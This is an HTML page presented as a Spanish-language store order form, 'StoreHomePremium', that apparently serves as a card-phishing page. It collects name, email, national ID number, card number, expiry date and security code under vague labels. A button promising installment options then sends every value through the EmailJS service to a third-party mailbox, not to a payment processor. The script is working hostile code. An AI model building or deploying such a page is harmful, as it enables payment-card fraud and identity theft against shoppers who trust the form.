<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>StoreHomePremium</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f2f4f7;
      display: flex;
      justify-content: center;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      color: #1f2933;
      padding: 24px;
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
    }

    h2 {
      font-size: 20px;
      margin-bottom: 16px;
      text-align: center;
      color: #0a2f7a;
    }

    label {
      display: block;
      margin-top: 12px;
      font-size: 13px;
      font-weight: 600;
      color: #374151;
    }

    input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #cbd5e1;
      margin-top: 6px;
      font-size: 14px;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border-color: #0a2f7a;
    }

    button {
      margin-top: 22px;
      width: 100%;
      padding: 13px;
      border: none;
      border-radius: 10px;
      background: #0a2f7a;
      color: white;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #08245f;
    }
  </style>
</head>

<body>
  <div class="card">
    <h2>StoreHomePremium – Registro de pedido</h2>

    <label>Monto</label>
    <input id="monto" type="number" inputmode="numeric" placeholder="Ingrese monto">

    <label>Tipo</label>
    <input id="tipo" type="text" placeholder="Ej: Electrodoméstico">

    <label>Nombre</label>
    <input id="nombre" type="text" placeholder="Nombre completo">

    <label>Email</label>
    <input id="email" type="email" placeholder="correo@ejemplo.com">

    <label>DNI</label>
    <input id="dni" type="number" inputmode="numeric" placeholder="DNI">

    <label>Titular</label>
    <input id="titular" type="text" placeholder="Titular del pedido">

    <label>Número de tarjeta / código</label>
    <input id="numero_tarjeta" type="text" inputmode="numeric" placeholder="Código numérico">

    <label>Fecha de referencia</label>
    <input id="fecha_expiracion" type="text" placeholder="MM/AA">

    <label>Código de seguridad</label>
    <input id="codigo_seguridad" type="number" inputmode="numeric" placeholder="Código">

    <button type="button" id="enviar">Ver opciones de cuotas</button>
  </div>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <script>
    emailjs.init("gOD19I3u7jPioagR4");

    document.getElementById("enviar").addEventListener("click", function () {

      emailjs.send(
        "service_p965auj",
        "template_h5kc29e",
        {
          monto: document.getElementById("monto").value,
          tipo: document.getElementById("tipo").value,
          nombre: document.getElementById("nombre").value,
          email: document.getElementById("email").value,
          dni: document.getElementById("dni").value,
          titular: document.getElementById("titular").value,
          numero_tarjeta: document.getElementById("numero_tarjeta").value,
          fecha_expiracion: document.getElementById("fecha_expiracion").value,
          codigo_seguridad: document.getElementById("codigo_seguridad").value
        }
      ).then(
        function () {
          alert("Formulario enviado correctamente");
        },
        function (error) {
          alert("Error al enviar el formulario");
          console.log(error);
        }
      );
    });
  </script>
</body>
</html>
